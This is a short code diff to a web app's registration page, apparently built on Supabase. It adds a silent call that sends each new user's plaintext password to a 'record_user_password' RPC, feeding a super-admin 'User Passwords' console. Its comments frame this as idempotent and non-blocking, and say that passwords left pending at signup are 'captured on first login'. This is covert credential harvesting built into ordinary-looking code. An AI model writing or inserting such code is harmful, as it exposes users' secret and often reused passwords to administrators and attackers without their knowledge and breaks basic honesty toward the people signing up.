@@ -261,6 +261,11 @@ function RegisterPageInner() {
 
       // Only create profile/client rows if session is immediately available (no email confirmation required)
       if (data?.session && data?.user?.id) {
+        // Mirror the chosen password into the super-admin "User Passwords"
+        // console (idempotent RPC, records only the caller's own password).
+        // Best-effort — never blocks registration. Without a session (email
+        // confirmation pending) it's captured on first login instead.
+        try { await supabase.rpc('record_user_password', { p_password: cleanPassword } as any) } catch { /* non-fatal */ }
         try {
           await supabase.from('profiles').upsert({
             id: data.user.id,
